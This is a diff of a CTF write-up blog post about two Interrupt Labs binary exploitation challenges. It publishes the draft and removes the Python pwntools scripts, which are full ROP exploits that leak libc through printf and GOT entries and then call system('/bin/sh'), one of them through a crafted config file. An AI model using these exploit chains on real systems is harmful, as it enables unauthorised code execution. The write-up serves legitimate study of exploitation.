@@ -6,7 +6,7 @@ categories: ["ctf"]
 author: "Ayman Boulaich"
 showToc: false
 TocOpen: false
-draft: true
+draft: false
 hidemeta: false
 comments: false
 summary: "I was randomly scrolling through some research forums when I ended up on Interrupt Labs’ blog. They had this cool post about integrating IDA with Obsidian, which caught my attention. Such a random thing made me read about them and his philosophy as a VR company and quickly loved his way of doing the things."
@@ -95,85 +95,13 @@ My plan is to craft a **ROP chain** that calls `printf` from the **PLT**, passin
 
 To overcome the limitation mentioned earlier, we should put everything which is placed at the top of previous `rsp` at the start of the payload.
 
-```python
-io = start()
-
-io.sendline("1")
-
-rop = ROP(exe)
-pop_rdi_ret = rop.find_gadget(["pop rdi" , "ret"]).address
-ret = rop.find_gadget(["ret"]).address
-
-payload = p64(exe.got.printf) + p64(ret) + p64(exe.sym.printf) + p64(ret) + p64(0x401196)
-
-payload = payload + b"A"* (0xd8 - len(payload)) + p64(pop_rdi_ret)
-io.sendlineafter(b"Enter Note Below", payload)
-
-io.recvline()
-leak = u64(io.recvline().strip().ljust(8,b"\x00"))
-log.info("Leak: " + hex(leak))
-```
-
 Also worth to mention that in order to spawn a shell at the end of the **ROP chain** we are returning to **the vulnerable subroutine.**
 
 In the second stage, as the **stack has been manipulated**, we do not have to pay attention to the above **limitation**.
 
-```python
-#!/usr/bin/env python3
-from pwn import *
-
-exe = context.binary = ELF(args.EXE or './challenge_1')
-libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
-
-context.terminal = ["tmux", "splitw", "-h"]
-
-context.log_level = 'debug'
-
-def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-gdbscript = '''
-start
-'''.format(**locals())
-
-io = start()
-
-io.sendline("1")
-
-rop = ROP(exe)
-pop_rdi_ret = rop.find_gadget(["pop rdi" , "ret"]).address
-ret = rop.find_gadget(["ret"]).address
-
-payload = p64(exe.got.printf) + p64(ret) + p64(exe.sym.printf) + p64(ret) + p64(0x401196)
-
-payload = payload + b"A"* (0xd8 - len(payload)) + p64(pop_rdi_ret)
-io.sendlineafter(b"Enter Note Below", payload)
-
-io.recvline()
-leak = u64(io.recvline().strip().ljust(8,b"\x00"))
-log.info("Leak: " + hex(leak))
-
-libc.address = leak - 0x61c90
-log.info("Libc base: " + hex(libc.address))
-
-rop = ROP(libc)
-binsh = next(libc.search(b"/bin/sh\x00"))
-
-payload = p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(libc.sym.system)
-payload = b"A"*0xd8 + payload
-
-io.sendlineafter(b"Enter Note Below", payload)
-
-io.interactive()
-```
-
 ![Untitled](/CTF/interruptlabsctf-13.png)
 
-![Untitled](/CTF/interruptlabsctf-14.png).jpg)
+![Untitled](/CTF/interruptlabsctf-14.png)
 
 ## User Input
 
@@ -249,139 +177,15 @@ This is how should look our **config file.**
 
 In order to craft a proper **ROP chain** to call `system` and **spawn a shell**, a **libc leak** will be needed, we can achieve that invoking `printf` from the **PLT** and passing a **populated GOT entry** as the first argument (in our case, I used `read`).
 
-```python
-rop = ROP(exe)
-pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
-
-payload = p64(pop_rdi) + p64(exe.got.read) + p64(exe.sym.printf) + p64(0x401764)
-pad = payload + b'A'*(0x32 - len(payload))
-heap = b'A'*0x16 + p64(pop_rdi)
-data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x1e) + heap
-
-config_path = "config_file_path"
-f = open(config_path, "wb")
-
-f.write(data)
-f.flush()
-```
-
 The binary gadget `pop_rdi` is placed into `[heap+0x48]` so execution returns directly to `rsp`. Is worth to mention that the end of our **ROP chain** loops back to `copyFromFd` in `main`, allowing us to repeat the attack.
 
 ![Untitled](/CTF/interruptlabsctf-30.png)
 
 Nicee we got a **libc leak**, let’s place the actual **ROP chain** to **spawn a shell,** appending the new **config file** to the existing file will do the trick.
 
-```python
-from pwn import *
-
-exe = ELF("./challenge_2")
-libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
-
-context.terminal = ["tmux", "splitw", "-h"]
-
-context.log_level = 'debug'
-
-def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-gdbscript = '''
-start
-'''.format(**locals())
-
-rop = ROP(exe)
-pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
-
-payload = p64(pop_rdi) + p64(exe.got.read) + p64(exe.sym.printf) + p64(0x401764)
-pad = payload + b'A'*(0x32 - len(payload))
-heap = b'A'*0x16 + p64(pop_rdi)
-data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x1e) + heap
-
-config_path = "config_file_path"
-f = open(config_path, "wb")
-
-f.write(data)
-f.flush()
-
-io = start([config_path])
-
-leak = io.recv(6).strip().ljust(8,b"\x00")
-
-libc.address = u64(leak) - 0x10e1e0
-binsh = next(libc.search(b"/bin/sh\x00"))
-
-payload = p64(pop_rdi) + p64(binsh) + p64(libc.sym.system)
-pad = payload + b'A'*(0x32 - len(payload))
-heap = b'A'*0x16 + p64(pop_rdi)
-data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x20) + heap
-
-f.write(data)
-f.flush()
-
-io.interactive()
-
-```
-
 ![Untitled](/CTF/interruptlabsctf-31.png)
 
 As expected the **binary finishes execution** before we can append the **second stage** to the config file. To keep it alive long enough, we need to prevent it from exiting. For this reason, I chose to **repeat** the first stage **10,000 times**.
-
-```python
-from pwn import *
-
-exe = ELF("./challenge_2")
-libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
-
-context.terminal = ["tmux", "splitw", "-h"]
-
-context.log_level = 'debug'
-
-def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-gdbscript = '''
-start
-'''.format(**locals())
-
-rop = ROP(exe)
-pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
-
-payload = p64(pop_rdi) + p64(exe.got.read) + p64(exe.sym.printf) + p64(0x401764)
-pad = payload + b'A'*(0x32 - len(payload))
-heap = b'A'*0x16 + p64(pop_rdi)
-data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x1e) + heap
-
-config_path = "config_file_path"
-f = open(config_path, "wb")
-for i in range(10000):
-    f.write(data)
-f.flush()
-
-io = start([config_path])
-
-leak = io.recv(6).strip().ljust(8,b"\x00")
-
-libc.address = u64(leak) - 0x10e1e0
-binsh = next(libc.search(b"/bin/sh\x00"))
-
-payload = p64(pop_rdi) + p64(binsh) + p64(libc.sym.system)
-pad = payload + b'A'*(0x32 - len(payload))
-heap = b'A'*0x16 + p64(pop_rdi)
-data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x20) + heap
-
-f.write(data)
-f.flush()
-
-io.interactive()
-
-```
 
 ![Untitled](/CTF/interruptlabsctf-32.png)
 
